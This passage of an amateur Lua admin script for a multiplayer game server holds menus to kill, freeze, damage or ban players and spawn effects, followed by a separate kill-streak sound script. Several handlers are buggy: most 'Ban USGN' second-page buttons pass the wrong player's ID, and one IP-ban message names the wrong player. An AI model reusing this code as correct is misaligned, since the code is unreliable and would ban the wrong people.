menu(id,"Slap a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Kill a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('killplayer 1')
	msg(""..player(id,"name").." [Admin] Killed "..name[1])
elseif buton==2 then
parse('killplayer 2')
	msg(""..player(id,"name").." [Admin] Killed "..name[2])
elseif buton==3 then
parse('killplayer 3')
	msg(""..player(id,"name").." [Admin] Killed "..name[3])
elseif buton==4 then
parse('killplayer 4')
	msg(""..player(id,"name").." [Admin] Killed "..name[4])
elseif buton==5 then
parse('killplayer 5')
	msg(""..player(id,"name").." [Admin] Killed "..name[5])
elseif buton==6 then
parse('killplayer 6')
	msg(""..player(id,"name").." [Admin] Killed "..name[6])
elseif buton==7 then
parse('killplayer 7')
	msg(""..player(id,"name").." [Admin] Killed "..name[7])
elseif buton==8 then
parse('killplayer 8')
	msg(""..player(id,"name").." [Admin] Killed "..name[8])
elseif buton==9 then
menu(id,"Kill a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Kill a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('killplayer 9')
	msg(""..player(id,"name").." [Admin] Killed "..name[9])
elseif buton==2 then
parse('killplayer 10')
	msg(""..player(id,"name").." [Admin] Killed "..name[10])
elseif buton==3 then
parse('killplayer 11')
	msg(""..player(id,"name").." [Admin] Killed "..name[11])
elseif buton==4 then
parse('killplayer 12')
	msg(""..player(id,"name").." [Admin] Killed "..name[12])
elseif buton==5 then
parse('killplayer 13')
	msg(""..player(id,"name").." [Admin] Killed "..name[13])
elseif buton==6 then
parse('killplayer 14')
	msg(""..player(id,"name").." [Admin] Killed "..name[14])
elseif buton==7 then
parse('killplayer 15')
	msg(""..player(id,"name").." [Admin] Killed "..name[15])
elseif buton==8 then
parse('killplayer 16')
	msg(""..player(id,"name").." [Admin] Killed "..name[16])
elseif buton==9 then
menu(id,"Kill a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Freeze a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('speedmod 1 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[1])
elseif buton==2 then
parse('speedmod 2 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[2])
elseif buton==3 then
parse('speedmod 3 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[3])
elseif buton==4 then
parse('speedmod 4 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[4])
elseif buton==5 then
parse('speedmod 5 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[5])
elseif buton==6 then
parse('speedmod 6 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[6])
elseif buton==7 then
parse('speedmod 7 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[7])
elseif buton==8 then
parse('speedmod 8 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[8])
elseif buton==9 then
menu(id,"Freeze a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Freeze a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('speedmod 9 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[9])
elseif buton==2 then
parse('speedmod 10 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[10])
elseif buton==3 then
parse('speedmod 11 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[11])
elseif buton==4 then
parse('speedmod 12 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[12])
elseif buton==5 then
parse('speedmod 13 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[13])
elseif buton==6 then
parse('speedmod 14 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[14])
elseif buton==7 then
parse('speedmod 15 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[15])
elseif buton==8 then
parse('speedmod 16 -100')
	msg(""..player(id,"name").." [Admin] Freezed "..name[16])
elseif buton==9 then
menu(id,"Freeze a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Bring 1 HP a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('sethealth 1 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[1])
elseif buton==2 then
parse('sethealth 2 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[2])
elseif buton==3 then
parse('sethealth 3 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[3])
elseif buton==4 then
parse('sethealth 4 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[4])
elseif buton==5 then
parse('sethealth 5 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[5])
elseif buton==6 then
parse('sethealth 6 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[6])
elseif buton==7 then
parse('sethealth 7 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[7])
elseif buton==8 then
parse('sethealth 8 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[8])
elseif buton==9 then
menu(id,"Bring 1 HP a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Bring 1 HP a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('sethealth 9 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[9])
elseif buton==2 then
parse('sethealth 10 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[10])
elseif buton==3 then
parse('sethealth 11 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[11])
elseif buton==4 then
parse('sethealth 12 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[12])
elseif buton==5 then
parse('sethealth 13 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[13])
elseif buton==6 then
parse('sethealth 14 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[14])
elseif buton==7 then
parse('sethealth 15 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[15])
elseif buton==8 then
parse('sethealth 16 1')
	msg(""..player(id,"name").." [Admin] Bring 1 HP "..name[16])
elseif buton==9 then
menu(id,"Bring 1 HP a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Ban USGN a Player - Names 1/2" then
if buton==1 then
thenames(i)
theusgn(i)
parse('banusgn '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[1])
elseif buton==2 then
parse('banusgn '..pusgn[2])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[2])
elseif buton==3 then
parse('banusgn '..pusgn[3])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[3])
elseif buton==4 then
parse('banusgn '..pusgn[4])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[4])
elseif buton==5 then
parse('banusgn '..pusgn[5])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[5])
elseif buton==6 then
parse('banusgn '..pusgn[6])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[6])
elseif buton==7 then
parse('banusgn '..pusgn[7])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[7])
elseif buton==8 then
parse('banusgn '..pusgn[8])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[8])
elseif buton==9 then
menu(id,"Ban USGN a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Ban USGN a Player - Names 2/2" then
if buton==1 then
thenames(i)
theusgn(i)
parse('banusgn '..pusgn[9])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[9])
elseif buton==2 then
parse('banusgn 10 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[10])
elseif buton==3 then
parse('banusgn 11 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[11])
elseif buton==4 then
parse('banusgn 12 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[12])
elseif buton==5 then
parse('banusgn 13 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[13])
elseif buton==6 then
parse('banusgn 14 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[14])
elseif buton==7 then
parse('banusgn 15 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[15])
elseif buton==8 then
parse('banusgn 16 '..pusgn[1])
	msg(""..player(id,"name").." [Admin] Banned USGN "..name[16])
elseif buton==9 then
menu(id,"Ban USGN a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Ban IP a Player - Names 1/2" then
if buton==1 then
thenames(i)
thepip(i)
parse('banip '..pip[1])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[2])
elseif buton==2 then
parse('banip '..pip[2])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[2])
elseif buton==3 then
parse('banip '..pip[3])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[3])
elseif buton==4 then
parse('banip '..pip[4])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[4])
elseif buton==5 then
parse('banip '..pip[5])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[5])
elseif buton==6 then
parse('banip '..pip[6])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[6])
elseif buton==7 then
parse('banip '..pip[7])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[7])
elseif buton==8 then
parse('banip '..pip[8])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[8])
elseif buton==9 then
menu(id,"Ban IP a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Ban IP a Player - Names 2/2" then
if buton==1 then
thenames(i)
thepip(i)
parse('banip '..pip[9])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[9])
elseif buton==2 then
parse('banip '..pip[10])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[10])
elseif buton==3 then
parse('banip '..pip[11])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[11])
elseif buton==4 then
parse('banip '..pip[12])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[12])
elseif buton==5 then
parse('banip '..pip[13])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[13])
elseif buton==6 then
parse('banip '..pip[14])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[14])
elseif buton==7 then
parse('banip '..pip[15])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[15])
elseif buton==8 then
parse('banip '..pip[16])
	msg(""..player(id,"name").." [Admin] Banned IP "..name[16])
elseif buton==9 then
menu(id,"Ban IP a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Ban NAME a Player - Names 1/2" then
if buton==1 then
thenames(i)
parse('banname '..name[1])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[1])
elseif buton==2 then
parse('banname '..name[2])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[2])
elseif buton==3 then
parse('banname '..name[3])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[3])
elseif buton==4 then
parse('banname '..name[4])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[4])
elseif buton==5 then
parse('banname '..name[5])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[5])
elseif buton==6 then
parse('banname '..name[6])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[6])
elseif buton==7 then
parse('banname '..name[7])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[7])
elseif buton==8 then
parse('banname '..name[8])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[8])
elseif buton==9 then
menu(id,"Ban NAME a Player - Names 2/2,"..name[9]..","..name[10]..","..name[11]..","..name[12]..","..name[13]..","..name[14]..","..name[15]..","..name[16]..",Back")
end
end
if title=="Ban NAME a Player - Names 2/2" then
if buton==1 then
thenames(i)
parse('banname '..name[9])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[9])
elseif buton==2 then
parse('banname '..name[10])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[10])
elseif buton==3 then
parse('banname '..name[11])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[11])
elseif buton==4 then
parse('banname '..name[12])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[12])
elseif buton==5 then
parse('banname '..name[13])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[13])
elseif buton==6 then
parse('banname '..name[14])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[14])
elseif buton==7 then
parse('banname '..name[15])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[15])
elseif buton==8 then
parse('banname '..name[16])
	msg(""..player(id,"name").." [Admin] Banned NAME "..name[16])
elseif buton==9 then
menu(id,"Ban NAME a Player - Names 1/2,"..name[1]..","..name[2]..","..name[3]..","..name[4]..","..name[5]..","..name[6]..","..name[7]..","..name[8]..",Next")
end
end
if title=="Spawn Effect" then
if buton==1 then
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==2 then
parse('effect "smoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 000 000 000')
menu(id,"Spawn Effect,ColorSmoke,Normal Smoke,Fire,Back")
elseif buton==3 then
parse('effect "fire" '..player(id,"x")..' '..player(id,"y")..' 0 0 000 000 000')
menu(id,"Spawn Effect,ColorSmoke,Normal Smoke,Fire,Back")
elseif buton==4 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Choose You ColorSmoke" then
if buton==1 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 255 000 000')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==2 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 000 255 000')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==3 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 000 000 255')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==4 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 255 255 000')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==5 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 255 128 000')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==6 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 000 000 000')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==7 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 255 255 255')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==8 then
parse('effect "colorsmoke" '..player(id,"x")..' '..player(id,"y")..' 0 0 128 128 128')
menu(id,"Choose You ColorSmoke,Red,Green,Blue,Yellow,Orange,Black,White,Grey,Back")
elseif buton==9 then
menu(id,"Spawn Effect,ColorSmoke,Normal Smoke,Fire,Back")
end
end
if title=="Admin Menu <More>" then
if buton==1 then
menu(id,"Load a Script,Level and Exp Script,Time Script,Position Script,No Script,Back")
elseif buton==2 then
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==3 then
	msg("The Admin Script v2.0")
	msg("By ¢®åz¥ßøø¥")
end
end
if title=="Load a Script" then
if buton==1 then
levelsystem[id]=1
timesystem[id]=0
positionsystem[id]=0
elseif buton==2 then
levelsystem[id]=0
timesystem[id]=1
positionsystem[id]=0
elseif buton==3 then
levelsystem[id]=0
timesystem[id]=0
positionsystem[id]=1
elseif buton==4 then
levelsystem[id]=0
timesystem[id]=0
positionsystem[id]=0
noscript[id]=1
elseif buton==5 then
menu(id,"Admin Menu <More>,Load a Script,Spawn Explosion,Script Info")
end
end
if title=="Spawn Explosion" then
if buton==1 then
parse('explosion '..player(id,"x")..' '..player(id,"y")..' 50 50 '..id)
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==2 then
parse('explosion '..player(id,"x")..' '..player(id,"y")..' 100 100 '..id)menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==3 then
parse('explosion '..player(id,"x")..' '..player(id,"y")..' 250 250 '..id)
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==4 then
parse('explosion '..player(id,"x")..' '..player(id,"y")..' 500 500 '..id)
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==5 then
parse('explosion '..player(id,"x")..' '..player(id,"y")..' 1000 1000 '..id)
menu(id,"Spawn Explosion,Explosion 1|Power:50,Explosion 2|Power:100,Explosion 3|Power:250,Explosion 4|Power:500,Explosion 5|Power:1000,Back")
elseif buton==6 then
menu(id,"Admin Menu <More>,Load a Script,Spawn Explosion,Script Info")
end
end
end
-----------------------
-- INITIAL SETUP     --
-----------------------
function initArray(m)
	local array = {}
	for i = 1, m do
		array[i]=0
	end
	return array
end
sample.ut.timer=initArray(32)
sample.ut.level=initArray(32)
sample.ut.fblood=0


-----------------------
-- PREPARE TO FIGHT! --
-----------------------
addhook("startround","sample.ut.startround")
function sample.ut.startround()
	parse("sv_sound \"fun/prepare.wav\"")
	sample.ut.fblood=0
end


-----------------------
-- KILL SOUNDS+MSGS  --
-----------------------
addhook("kill","sample.ut.kill")
function sample.ut.kill(killer,victim,weapon)
	if (os.clock()-sample.ut.timer[killer])>3 then
		sample.ut.level[killer]=0;
	end
	level=sample.ut.level[killer]
	level=level+1
	sample.ut.level[killer]=level
	sample.ut.timer[killer]=os.clock()
	-- FIRST BLOOD?
	if (sample.ut.fblood==0) then
		sample.ut.fblood=1
		parse("sv_sound \"fun/firstblood.wav\"");
		msg (player(killer,"name").." conseguiu Seu 1 Frag com o "..player(victim,"name").."!@C")
	end
	-- HUMILIATION? (KNIFEKILL)
	if (weapon==50) then
		-- HUMILIATION!
		parse("sv_sound \"fun/humiliation.wav\""); 
		msg (player(killer,"name").." Humilhou o Coitado Do  "..player(victim,"name").."!@C")
	else
		-- REGULAR KILL
		if (level==1) then
			-- Single Kill! Nothing Special!
		elseif (level==2) then
			parse("sv_sound \"fun/doublekill.wav\"");
			msg (player(killer,"name").." matou 2 HAHA !@C")
		elseif (level==3) then
			parse("sv_sound \"fun/multikill.wav\"")
			msg (player(killer,"name").." matou 3 UI !@C")
		elseif (level==4) then
			parse("sv_sound \"fun/ultrakill.wav\"")
			msg (player(killer,"name").." matou 4 JESUS !!@C")
		elseif (level==5) then
			parse("sv_sound \"fun/monsterkill.wav\"")
			msg (player(killer,"name").." matou 5 DEUSSSSS !!@C")
		else
			parse("sv_sound \"fun/unstoppable.wav\"")
			msg (player(killer,"name").." TÁ DEMAIS MATO MAIS DE 5 UI ! "..level.." KILLS!@C")
		end
	end
end
